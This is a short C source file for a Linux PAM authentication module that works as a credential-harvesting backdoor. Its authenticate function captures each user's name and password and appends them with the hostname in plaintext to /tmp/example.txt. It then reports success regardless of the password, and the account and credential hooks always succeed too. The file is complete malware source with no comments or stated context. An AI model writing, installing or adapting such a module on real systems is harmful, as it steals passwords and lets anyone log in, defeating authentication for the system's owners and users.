#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h> 
#include <security/pam_modules.h> 
#include <security/pam_ext.h> 
#include <unistd.h>

#define STOREPATH "/tmp/example.txt"

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    return PAM_SUCCESS; 
    }
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS; 
    }
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    int retval;
    const char* username;
    const char* password; 
    char hostname[128];
    retval = pam_get_user(pamh, &username, "Username: "); 
    if (retval != PAM_SUCCESS) {
        return retval;
        }
    retval = pam_get_authtok(pamh,PAM_AUTHTOK,&password,NULL); if (retval != PAM_SUCCESS) {
        return retval;
        }
    gethostname(hostname, sizeof hostname);
    FILE *fp = NULL;
    fp = fopen(STOREPATH, "a+");
    fprintf(fp, "%s:%s:%s\n",hostname,username,password); 
    fclose(fp);

    return PAM_SUCCESS; 
}
